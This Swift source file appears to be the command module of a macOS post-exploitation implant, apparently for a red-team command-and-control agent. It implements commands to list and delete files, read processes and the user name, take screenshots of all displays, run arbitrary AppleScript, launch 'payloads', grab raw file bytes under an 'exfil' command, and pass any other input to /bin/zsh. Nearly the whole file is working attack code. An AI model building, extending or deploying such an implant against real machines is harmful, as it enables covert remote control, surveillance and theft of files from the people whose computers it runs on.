import Foundation
import AppKit
extension Collection where Indices.Iterator.Element == Index {
  public subscript(safe index: Index) -> Element? {
    startIndex..<endIndex ~= index ? self[index]: nil
  }
}

struct returnData {
  var inCommand: String
  var returnType: String
  var returnData: Any
  var returnDict: [String: Any] {
    return ["inCommand":inCommand, "returnType":returnType, "returnData":returnData]
  }
}
struct returnDataRaw {
  var inCommand: String
  var returnType: String
  var fileName: String
  var returnData: Any
  var returnDict: [String: Any] {
    return ["inCommand":inCommand, "returnType":returnType, "fileName":fileName, "returnData":returnData]
  }
}

enum Cmd: String {
  case ls, cd, cdr, mkdir, whoami, rm, rmdir, ps, cat, mv, strings, cp, screenshot, osascript, exfil, execute, man, shell
}

struct Command {
  let command: Cmd
  let arguments: [String]
  let filePath: String?
  let fullpath: String
  
  init?(_ cmd: String) {
    guard !cmd.isEmpty else { return nil }
    let split = cmd.split(separator: ";").lazy.map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
    command = Cmd(rawValue: split.first!) ?? .shell
    arguments = Array(split.dropFirst())
    filePath = arguments.first
    fullpath = "\(FileManager.default.currentDirectoryPath)/\(filePath ?? "")"
  }
}

public enum CmdValue {
  case string(String)
  case data(Data)
}

public typealias CmdResult = Result<CmdValue, Error>

public class ASH {
  static let fileManager = FileManager.default

//  func lsCommand() -> CmdResult {
//    let path = ASH.fileManager.currentDirectoryPath
//    do {
//      let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
//      return .success(.string("\(path)\n\(listPaths)"))
//    }
//    catch {
//      return .failure(error)
//    }
//  }
//  
//  func cdCommand(_ destPath: String) -> CmdResult {
//    
//  }

  public func command(command: String) -> NSDictionary {
    guard let cmd = Command(command)
    else { return returnData(inCommand: "Null", returnType: "Error", returnData: "No commands were passed").returnDict as NSDictionary }
    
    let commandString = cmd.command.rawValue
    switch cmd.command {
    case .ls:
      let path = ASH.fileManager.currentDirectoryPath
      do {
        let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
        let commandResult = "\(path)\n\(listPaths)"
        return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .cd:
      //Changes directory
      var newDirPath = ""
      if #available(macOS 10.12, *) {
        newDirPath = cmd.filePath ?? ASH.fileManager.homeDirectoryForCurrentUser.path
      } else {
        // Fallback on earlier versions
        newDirPath = cmd.filePath ?? ASH.fileManager.currentDirectoryPath
      }
      ASH.fileManager.changeCurrentDirectoryPath(newDirPath)
      return returnData(inCommand: commandString, returnType: "String", returnData: newDirPath).returnDict as NSDictionary
    case .cdr:
        //Go to the relative folder in this directory
        ASH.fileManager.changeCurrentDirectoryPath(cmd.fullpath)
        return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
    case .mkdir:
      do {
        try ASH.fileManager.createDirectory(at: URL(fileURLWithPath: cmd.fullpath), withIntermediateDirectories: false, attributes: nil)
        return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .whoami:
        //Do Get username
      return returnData(inCommand: commandString, returnType: "String", returnData: NSUserName()).returnDict as NSDictionary
    case .rm:
        //Delete a file
        do {
          try ASH.fileManager.removeItem(at: URL(fileURLWithPath: cmd.fullpath))
          return returnData(inCommand: commandString, returnType: "String", returnData: cmd.fullpath).returnDict as NSDictionary
        }
        catch {
          return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
        }
    case .ps:
        //Will list all processes
      let commandResult = NSWorkspace.shared.runningApplications.compactMap(\.localizedName).joined(separator: "\n")
      return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
    case .cat:
      do {
        let fileResults = try String(contentsOf: URL(fileURLWithPath: cmd.fullpath), encoding: .utf8)
        return returnData(inCommand: commandString, returnType: "String", returnData: fileResults).returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .mv:
      guard cmd.arguments.count > 1 else { return returnData(inCommand: commandString, returnType: "Error", returnData: "no enough arguments").returnDict as NSDictionary }
      let origUrl = URL(fileURLWithPath: cmd.arguments[0])
      let destURL = URL(fileURLWithPath: cmd.arguments[1])
      //Move a file.  This will delete the previous file
      do {
        try ASH.fileManager.copyItem(at: origUrl, to: destURL)
//            try ASH.fileManager.copyItem(atPath: String(origDir!), toPath: String(destDir!))
        try ASH.fileManager.removeItem(at: origUrl)
        return returnData(inCommand: commandString, returnType: "String", returnData: "\(origUrl.path) >  \(destURL.path)").returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .strings:
      // TODO: - Rewrite this to actually replicate strings functionality
      let file = URL(fileURLWithPath: cmd.fullpath)
      do {
        let fileResults = try String(contentsOf: file, encoding: .ascii)
        return returnData(inCommand: commandString, returnType: "String", returnData:fileResults).returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .cp:
      //Copy a file
      guard cmd.arguments.count > 1 else { return returnData(inCommand: commandString, returnType: "Error", returnData: "no enough arguments").returnDict as NSDictionary }
//      let commandSplit = command.components(separatedBy: "; ")[safe: 1]
//      if commandSplit != nil {
//        let directories = commandSplit!.split(separator: " ")
//        let origDir = directories[safe: 0]
//        let destDir = directories[safe: 1]
//        if origDir != nil && destDir != nil {
      let origUrl = URL(fileURLWithPath: cmd.arguments[0])
      let destURL = URL(fileURLWithPath: cmd.arguments[1])

      do {
        try ASH.fileManager.copyItem(at: origUrl, to: destURL)
        return returnData(inCommand: commandString, returnType: "String", returnData: "\(origUrl.path) > \(destURL.path)").returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .screenshot:
      //Gets overall displays
      //Some bugs exist with this command
      //For example, it doesn't cycle through virtual desktops and will screenshot a random one
      //This will notify the user requesting permission to take pictures on 10.15+
      var displayCount: UInt32 = 0
      var displayList = CGGetActiveDisplayList(0, nil, &displayCount)
      if displayList == CGError.success {
        //Places all the displays into an object
        let capacity = Int(displayCount)
//          let activeDisplay = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: capacity)
        var activeDisplay = Array<CGDirectDisplayID>(repeating: 0, count: capacity) //UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: capacity)
        displayList = CGGetActiveDisplayList(displayCount, &activeDisplay, &displayCount)
        if displayList == CGError.success {
          // This currently only returns the screenshot for the first display in the array
          // TODO: - Return full array of shots
          for singleDisplay in 0..<Int(displayCount) {
            let screenshotTime = Date().timeIntervalSince1970
            let screenshot: CGImage = CGDisplayCreateImage(activeDisplay[singleDisplay])!
            let bitmap = NSBitmapImageRep(cgImage: screenshot)
            let screenshotData = bitmap.representation(using: .jpeg, properties: [:])!
            return returnDataRaw(inCommand: commandString, returnType: "Image", fileName: "\(screenshotTime).jpg", returnData: screenshotData).returnDict as NSDictionary
          }
        }
      }
    case .osascript:
      guard let source = cmd.arguments.first else { return returnData(inCommand: commandString, returnType: "Error", returnData: "No script provided").returnDict as NSDictionary }
        let scriptOutput = NSAppleScript(source: source)!
        var scriptErr: NSDictionary?
        scriptOutput.executeAndReturnError(&scriptErr)
        if let scriptErr = scriptErr {
          return returnData(inCommand: commandString, returnType: "Error", returnData: scriptErr).returnDict as NSDictionary
        } else {
          return returnData(inCommand: commandString, returnType: "String", returnData: source).returnDict as NSDictionary
        }
    case .exfil:
      guard ASH.fileManager.fileExists(atPath: cmd.fullpath)
      else { return returnData(inCommand: commandString, returnType: "Error", returnData: "File doesn't exist").returnDict as NSDictionary }
      do {
        let data = try Data(contentsOf: URL(fileURLWithPath: cmd.fullpath))
        return returnDataRaw(inCommand: commandString, returnType: "Data", fileName: cmd.filePath ?? "", returnData: data).returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .execute:
      //Will execute payloads, this typically works better when you're in the same directory as the destination payload
      guard let commandSplit = cmd.arguments.first else { return returnData(inCommand: commandString, returnType: "Error", returnData: "No arguments passed to execute command").returnDict as NSDictionary }
      do {
        try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit), options: .default, configuration: .init())
        return returnData(inCommand: commandString, returnType: "String", returnData: "\(command) successful").returnDict as NSDictionary
      }
      catch {
        return returnData(inCommand: commandString, returnType: "Error", returnData: error).returnDict as NSDictionary
      }
    case .man:
        let commandResult = """
                    The following are commands ran as API calls:
                    mkdir; --- Make a directory in your current directory.
                    whoami; --- Print the current user.
                    cdr; --- Go to a single folder from your current directory.
                    cd; --- Change directories.
                    ls; --- List the directory.
                    ps; --- Will list all processes not limited to user processes.
                    strings; --- This will print the contents of a file.
                    mv; --- Perform a mv command to move files/folders.
                    cp; --- Copy a file/folder.
                    screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
                    osascript; <Code> --- This will run an Apple script.
                    exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
                    execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
                    """
        return returnData(inCommand: commandString, returnType: "String", returnData: commandResult).returnDict as NSDictionary
      default:
        let shell = Process()
        let output = Pipe()
        shell.launchPath = "/bin/zsh"
        shell.standardOutput = output
        let newCommand = [command]
        shell.arguments = ["-c"] + newCommand
        shell.launch()
        shell.waitUntilExit()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        let newOutput = String(data: data, encoding: .utf8)
        return returnData(inCommand: commandString, returnType: "String", returnData: newOutput!).returnDict as NSDictionary
      }
//    }
//    else {
//      return returnData(inCommand: "Null", returnType: "Error", returnData: "No commands were passed").returnDict as NSDictionary
//    }
    return returnData(inCommand: command, returnType: "Error", returnData: "Nothing matched the command").returnDict as NSDictionary
  }
}
